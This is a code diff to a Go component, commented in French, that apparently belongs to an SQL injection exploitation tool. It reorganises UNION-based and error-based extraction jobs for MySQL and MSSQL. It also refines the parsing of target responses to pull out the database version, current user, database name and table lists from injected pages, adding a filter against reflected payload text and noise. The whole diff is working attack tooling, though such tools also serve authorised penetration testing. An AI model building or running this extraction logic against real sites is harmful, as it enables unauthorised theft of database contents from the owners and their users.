@@ -40,9 +40,24 @@ func BuildJobs(dbms string, vulnType models.VulnType) []ExtractionJob {
 func sqliJobs(dbms string, vulnType models.VulnType) []ExtractionJob {
 	var jobs []ExtractionJob
 
-	// Déterminer le nombre de colonnes UNION (test 1-4)
-	unionCols := []int{1, 2, 3, 4}
+	switch vulnType {
+	case models.SQLiUnion:
+		jobs = append(jobs, buildUnionJobs(dbms)...)
+	case models.SQLiError:
+		jobs = append(jobs, buildErrorJobs(dbms)...)
+	case models.SQLiBoolean, models.SQLiTime:
+		// Blind : uniquement error-based (pas de UNION sur réponses texte)
+		jobs = append(jobs, buildErrorJobs(dbms)...)
+	default:
+		jobs = append(jobs, buildUnionJobs(dbms)...)
+		jobs = append(jobs, buildErrorJobs(dbms)...)
+	}
+	return jobs
+}
 
+func buildUnionJobs(dbms string) []ExtractionJob {
+	var jobs []ExtractionJob
+	unionCols := []int{1, 2, 3, 4}
 	for _, cols := range unionCols {
 		for _, def := range sqliDefs(dbms) {
 			selectExpr := buildUnionSelect(def.expr, cols)
@@ -53,19 +68,20 @@ func sqliJobs(dbms string, vulnType models.VulnType) []ExtractionJob {
 			})
 		}
 	}
+	return jobs
+}
 
-	// Error-based (MySQL principalement)
+func buildErrorJobs(dbms string) []ExtractionJob {
+	var jobs []ExtractionJob
 	if dbms == "mysql" || dbms == "generic" || dbms == "" {
 		for _, def := range errorDefs() {
 			jobs = append(jobs, ExtractionJob{
 				DataType: def.dtype,
-				Payload:    def.payload,
-				Method:     "error",
+				Payload:  def.payload,
+				Method:   "error",
 			})
 		}
 	}
-
-	// MSSQL error cast
 	if dbms == "mssql" || dbms == "generic" || dbms == "" {
 		jobs = append(jobs, ExtractionJob{
 			DataType: DataVersion,
@@ -73,8 +89,6 @@ func sqliJobs(dbms string, vulnType models.VulnType) []ExtractionJob {
 			Method:   "error",
 		})
 	}
-
-	_ = vulnType
 	return jobs
 }
 
@@ -176,13 +190,16 @@ func ParseResponse(body, payload, method string, dtype DataType) (string, bool) 
 	// EXTRACTVALUE / UPDATEXML : données entre ~
 	reTilde := regexp.MustCompile(`~([^~]+)~`)
 	if m := reTilde.FindStringSubmatch(body); len(m) > 1 {
-		return strings.TrimSpace(m[1]), true
+		val := strings.TrimSpace(m[1])
+		if isValidExtractedValue(dtype, val, payload) {
+			return val, true
+		}
 	}
 
 	// Versions MySQL
 	reMySQLVer := regexp.MustCompile(`(?i)(\d+\.\d+\.\d+[-\w]*(?:mysql|mariadb)?[^\s<"]*)`)
 	if dtype == DataVersion {
-		if m := reMySQLVer.FindStringSubmatch(body); len(m) > 1 {
+		if m := reMySQLVer.FindStringSubmatch(body); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
 			return m[1], true
 		}
 	}
@@ -190,7 +207,7 @@ func ParseResponse(body, payload, method string, dtype DataType) (string, bool) 
 	// PostgreSQL version
 	rePG := regexp.MustCompile(`(?i)(PostgreSQL \d+\.\d+[^\s<"]*)`)
 	if dtype == DataVersion {
-		if m := rePG.FindStringSubmatch(body); len(m) > 1 {
+		if m := rePG.FindStringSubmatch(body); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
 			return m[1], true
 		}
 	}
@@ -198,23 +215,23 @@ func ParseResponse(body, payload, method string, dtype DataType) (string, bool) 
 	// MSSQL
 	reMSSQL := regexp.MustCompile(`(?i)(Microsoft SQL Server \d+[^\s<"]*)`)
 	if dtype == DataVersion {
-		if m := reMSSQL.FindStringSubmatch(body); len(m) > 1 {
+		if m := reMSSQL.FindStringSubmatch(body); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
 			return m[1], true
 		}
 	}
 
-	// Noms de tables / database en réponse UNION
-	if dtype == DataDatabase || dtype == DataTables || dtype == DataUser {
-		// Réponse nettoyée sans le payload réfléchi
-		cleaned := strings.ToLower(body)
-		if strings.Contains(strings.ToLower(payload), "database()") && !strings.Contains(cleaned, "union select") {
-			reCMS := regexp.MustCompile(`(?i)\b([a-z][a-z0-9_]{2,20})\b`)
-			if m := reCMS.FindAllString(body, -1); len(m) > 0 {
-				for _, s := range m {
-					if !isNoise(s) && len(s) > 3 {
-						return s, true
-					}
-				}
+	// database/tables : uniquement via EXTRACTVALUE (~...~) ou UNION confirmé
+	if dtype == DataDatabase || dtype == DataTables {
+		if strings.Contains(strings.ToLower(payload), "database()") {
+			reDB := regexp.MustCompile(`(?i)\b([a-z][a-z0-9]*(?:_[a-z0-9]+)+)\b`)
+			if m := reDB.FindStringSubmatch(body); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
+				return m[1], true
+			}
+		}
+		if dtype == DataTables {
+			reTables := regexp.MustCompile(`(?i)\b([a-z][a-z0-9_]*(?:,[a-z][a-z0-9_]*){2,})\b`)
+			if m := reTables.FindStringSubmatch(body); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
+				return m[1], true
 			}
 		}
 	}
@@ -229,20 +246,34 @@ func ParseResponse(body, payload, method string, dtype DataType) (string, bool) 
 		}
 	}
 
-	// UNION générique : contenu nouveau hors payload
+	// UNION : version ou identifiants DB explicites
 	if method == "union" && len(body) > 10 {
 		cleaned := body
 		if payload != "" {
 			cleaned = strings.ReplaceAll(cleaned, payload, "")
 		}
-		// Version dans réponse
-		for _, re := range []*regexp.Regexp{
-			regexp.MustCompile(`(?i)\d+\.\d+\.\d+[-\w.]*`),
-			regexp.MustCompile(`(?i)root@[\w%.]+`),
-			regexp.MustCompile(`(?i)[a-z_]+,[a-z_]+,[a-z_]+`), // tables list
-		} {
-			if m := re.FindString(cleaned); m != "" && !isNoise(m) {
+		switch dtype {
+		case DataVersion:
+			for _, re := range []*regexp.Regexp{
+				regexp.MustCompile(`(?i)\d+\.\d+\.\d+[-\w.]*(?:mysql|mariadb|postgresql|sql server)`),
+				regexp.MustCompile(`(?i)PostgreSQL \d+\.\d+`),
+				regexp.MustCompile(`(?i)Microsoft SQL Server \d+`),
+			} {
+				if m := re.FindString(cleaned); m != "" && isValidExtractedValue(dtype, m, payload) {
+					return m, true
+				}
+			}
+		case DataUser:
+			if m := regexp.MustCompile(`(?i)root@[\w%.]+`).FindString(cleaned); m != "" && isValidExtractedValue(dtype, m, payload) {
 				return m, true
+			}
+		case DataTables:
+			if m := regexp.MustCompile(`(?i)[a-z][a-z0-9_]+(?:,[a-z][a-z0-9_]+){2,}`).FindString(cleaned); m != "" && isValidExtractedValue(dtype, m, payload) {
+				return m, true
+			}
+		case DataDatabase:
+			if m := regexp.MustCompile(`(?i)\b([a-z][a-z0-9]*(?:_[a-z0-9]+)+)\b`).FindStringSubmatch(cleaned); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
+				return m[1], true
 			}
 		}
 	}
@@ -250,11 +281,64 @@ func ParseResponse(body, payload, method string, dtype DataType) (string, bool) 
 	return "", false
 }
 
+func isValidExtractedValue(dtype DataType, value, payload string) bool {
+	v := strings.TrimSpace(value)
+	if v == "" || len(v) < 2 {
+		return false
+	}
+	lower := strings.ToLower(v)
+	if isNoise(lower) {
+		return false
+	}
+	// Rejeter fragments SQL / payload réfléchi
+	sqlFragments := []string{
+		"group_concat", "information_schema", "extractvalue", "updatexml",
+		"concat(0x", "select ", "union ", "from ", "where ", "null--",
+		"xpath syntax", "syntax error",
+	}
+	for _, frag := range sqlFragments {
+		if strings.Contains(lower, frag) {
+			return false
+		}
+	}
+	if payload != "" && strings.Contains(strings.ToLower(payload), lower) {
+		return false
+	}
+	switch dtype {
+	case DataDatabase:
+		// Noms de DB : identifiant avec underscore ou alphanum ≥ 4 sans être une version
+		if regexp.MustCompile(`^\d+\.\d+`).MatchString(v) {
+			return false
+		}
+		return regexp.MustCompile(`^[a-z][a-z0-9_]{3,}$`).MatchString(lower)
+	case DataTables:
+		if strings.Contains(lower, ",") {
+			return regexp.MustCompile(`^[a-z][a-z0-9_]+(,[a-z][a-z0-9_]+)+$`).MatchString(lower)
+		}
+		return regexp.MustCompile(`^[a-z][a-z0-9_]{3,}$`).MatchString(lower)
+	case DataVersion:
+		return regexp.MustCompile(`\d+\.\d+`).MatchString(v) ||
+			strings.Contains(lower, "postgresql") ||
+			strings.Contains(lower, "sql server")
+	case DataUser:
+		return strings.Contains(v, "@") || regexp.MustCompile(`^[a-z][a-z0-9_]{2,}$`).MatchString(lower)
+	}
+	return true
+}
+
 func isNoise(s string) bool {
 	noise := map[string]bool{
 		"null": true, "select": true, "union": true, "html": true,
 		"body": true, "http": true, "result": true, "error": true,
 		"the": true, "and": true, "for": true, "from": true,
+		"have": true, "results": true, "total": true, "items": true,
+		"account": true, "product": true, "search": true, "comment": true,
+		"balance": true, "hotel": true, "flight": true, "patient": true,
+		"report": true, "generated": true, "artist": true, "artists": true,
+		"login": true, "attempt": true, "statement": true, "invoice": true,
+		"page": true, "orders": true, "contact": true, "booking": true,
+		"record": true, "post": true, "review": true, "rating": true,
+		"database": true, "syntax": true, "near": true, "line": true,
 	}
 	return noise[strings.ToLower(s)]
 }
